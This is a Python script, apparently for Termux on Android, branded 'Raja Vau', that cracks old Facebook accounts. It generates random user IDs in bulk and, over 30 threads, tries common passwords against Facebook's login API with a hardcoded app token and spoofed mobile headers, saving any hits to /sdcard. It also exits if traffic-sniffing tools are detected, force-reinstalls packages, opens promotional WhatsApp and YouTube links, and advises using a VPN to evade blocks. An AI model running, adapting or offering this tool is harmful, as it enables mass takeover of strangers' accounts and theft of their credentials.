import lzma
import zlib
import codecs
import base64
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

import os, sys
os.system('xdg-open https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4')
channel_link = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

def get_local_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mRAJA VAU SERVER LOADING....')
os.system ('espeak -a 300 " WELLCOME TO RAJA VAU TOOL "')

os.system('pip uninstall -y requests chardet urllib3 idna certifi')
os.system('python -m pip install --upgrade chardet urllib3 idna certifi requests')
os.system('python -m pip install --upgrade httpx beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')

os.system('xdg-open https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4')
os.system('xdg-open https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI')


# --- Anti-tampering and Security Checks ---
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m' 

# ==================== BANNER COLORS ====================
RESET  = '\033[0m'
BOLD   = '\033[1m'

RED    = '\033[38;5;196m'
ORANGE = '\033[38;5;208m'
YELLOW = '\033[38;5;226m'
GREEN  = '\033[38;5;46m'
CYAN   = '\033[38;5;51m'
BLUE   = '\033[38;5;39m'
PURPLE = '\033[38;5;129m'
PINK   = '\033[38;5;201m'
WHITE  = '\033[1;37m'
GRAY   = '\033[38;5;245m'
R = RR
P = PP
C = GS
RESET = W

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])


sys.stdout.write('\x1b]2;𓆩【KAMAL】𓆪 \x07')

def type_name_animation():
    name = "✦ 𝑲𝑨𝑴𝑨𝑳  𝑽𝑨𝑼 ✦"
    print()
    sys.stdout.write(YELLOW + BOLD + "          ")
    sys.stdout.flush()
    for char in name:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.12)
    print(RESET)
    time.sleep(0.3)

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print()
    # Centered KAMAL Banner
    print(RED + "   ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗         " + RESET)
    print(RED + "   ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║         " + RESET)
    print(RED + "   █████╔╝ ███████║██╔████╔██║███████║██║         " + RESET)
    print(RED + "   ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║         " + RESET)
    print(RED + "   ██║  ██╗██║  ██║██║ ╚═╝ ██║██║  ██║███████╗    " + RESET)
    print(RED + "   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝    " + RESET)
    
    type_name_animation()
    print()
    
    # Centered Details Box
    print(CYAN + "  ┌────────────────────────────────────────────────────────┐" + RESET)
    print(CYAN + f"  │ {RED}START TIME    {CYAN}: {WHITE}{start_time_str}                   {CYAN}│" + RESET)
    print(CYAN + "  ├────────────────────────────────────────────────────────┤" + RESET)
    print(CYAN + f"  │ {WHITE}Admin         {CYAN}: {YELLOW}Raja Vau                               {CYAN}│" + RESET)
    print(CYAN + f"  │ {WHITE}Owner         {CYAN}: {YELLOW}Raja Vau Teach World                   {CYAN}│" + RESET)
    print(CYAN + f"  │ {WHITE}YouTube       {CYAN}: {BLUE}https://youtube.com/@raja-vau          {CYAN}│" + RESET)
    print(CYAN + f"  │ {WHITE}Contact Admin {CYAN}: {GREEN}+880 1345-294347                       {CYAN}│" + RESET)
    print(CYAN + "  └────────────────────────────────────────────────────────┘" + RESET)
    print()


def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def approval():
    os.system('clear')
    ____banner____()
    print("\033[1;36m════════════════════════════════════════════════════════════")
    print(f"\033[1;32m [✓] User Name : \033[1;33mRaja Vau")
    print("\033[1;36m════════════════════════════════════════════════════════════")
    
    CORRECT_PASSWORD = "RAJA2026" 
    
    user_pass = input("\033[1;37m [?] Enter Password   : \033[1;32m")
    
    if user_pass == CORRECT_PASSWORD:
        print("\n\033[1;32m [✓] Login Successful! Welcome Raja Vau.")
        time.sleep(2)
        os.system('clear')
        ____banner____()
        print("\033[1;32mWelcome to Raja Vau Teach World")
        print("Your Key Approved")
        time.sleep(2)
        BNG_71_()
    else:
        print("\n\033[1;31m [×] Incorrect Password! Access Denied.")
        time.sleep(2)
        exit()

def main1():
    os.system('clear')


def linex():
    print('\x1b[38;5;220m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def animated_choice_prompt(prompt_text):
    for char in prompt_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)
    return input()


def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = animated_choice_prompt(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m 2010-2014')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m 2009 series ')
    linex()
    _input = animated_choice_prompt(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()


def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
    ask = animated_choice_prompt(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} [20000]   [30000] [60000] [99999]")
    limit = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '1000000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD🚀 A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;38mMETHOD✅ B')
    linex()
    meth = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;38mUSE AIRPLANE & PAID VPN{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    ask = animated_choice_prompt(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;38mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;38mEXAMPLE {Y}:{G} [20000]   [30000] [60000] [99999]")
    limit = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;203mMETHOD🚀 A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD✅ B')
    linex()
    meth = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;38mUSE AIRPLANE & PAID VPN{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;38mOLD CODE {Y}:{G} 2009 ")
    ask = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} [20000]   [30000] [60000] [99999]")
    limit = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;203mMETHOD🚀 A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod✅ B')
    linex()
    meth = animated_choice_prompt(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m✘\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;38mUSE AIRPLANE & PAID VPN{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-VAU-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                success_msg = f"""
\x1b[38;5;46m┌────────────────────────────────────────────────────────┐
│ \x1b[38;5;220m[✓] SUCCESSFUL ACCOUNT FOUND\x1b[38;5;46m                           │
├────────────────────────────────────────────────────────┤
│ \x1b[1;37mনাম     : \x1b[38;5;220mRaja Vau\x1b[38;5;46m                                     │
│ \x1b[1;37mFB UID  : \x1b[38;5;46m{uid}\x1b[38;5;46m                                 │
│ \x1b[1;37mFB PASS : \x1b[38;5;196m{pw}\x1b[38;5;46m                                           │
└────────────────────────────────────────────────────────┘\x1b[0m"""
                print(success_msg)
                open('/sdcard/RAJA-VAU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                success_msg = f"""
\x1b[38;5;46m┌────────────────────────────────────────────────────────┐
│ \x1b[38;5;220m[✓] SUCCESSFUL ACCOUNT FOUND\x1b[38;5;46m                           │
├────────────────────────────────────────────────────────┤
│ \x1b[1;37mনাম     : \x1b[38;5;220mRaja Vau\x1b[38;5;46m                                     │
│ \x1b[1;37mFB UID  : \x1b[38;5;46m{uid}\x1b[38;5;46m                                 │
│ \x1b[1;37mFB PASS : \x1b[38;5;196m{pw}\x1b[38;5;46m                                           │
└────────────────────────────────────────────────────────┘\x1b[0m"""
                print(success_msg)
                open('/sdcard/RAJA-VAU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA-VAU-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                success_msg = f"""
\x1b[38;5;46m┌────────────────────────────────────────────────────────┐
│ \x1b[38;5;220m[✓] SUCCESSFUL ACCOUNT FOUND\x1b[38;5;46m                           │
├────────────────────────────────────────────────────────┤
│ \x1b[1;37mনাম     : \x1b[38;5;220mRaja Vau\x1b[38;5;46m                                     │
│ \x1b[1;37mFB UID  : \x1b[38;5;46m{uid}\x1b[38;5;46m                                 │
│ \x1b[1;37mFB PASS : \x1b[38;5;196m{pw}\x1b[38;5;46m                                           │
└────────────────────────────────────────────────────────┘\x1b[0m"""
                print(success_msg)
                open('/sdcard/RAJA-VAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                success_msg = f"""
\x1b[38;5;46m┌────────────────────────────────────────────────────────┐
│ \x1b[38;5;220m[✓] SUCCESSFUL ACCOUNT FOUND\x1b[38;5;46m                           │
├────────────────────────────────────────────────────────┤
│ \x1b[1;37mনাম     : \x1b[38;5;220mRaja Vau\x1b[38;5;46m                                     │
│ \x1b[1;37mFB UID  : \x1b[38;5;46m{uid}\x1b[38;5;46m                                 │
│ \x1b[1;37mFB PASS : \x1b[38;5;196m{pw}\x1b[38;5;46m                                           │
└────────────────────────────────────────────────────────┘\x1b[0m"""
                print(success_msg)
                open('/sdcard/RAJA-VAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

if __name__ == "__main__":
    approval()
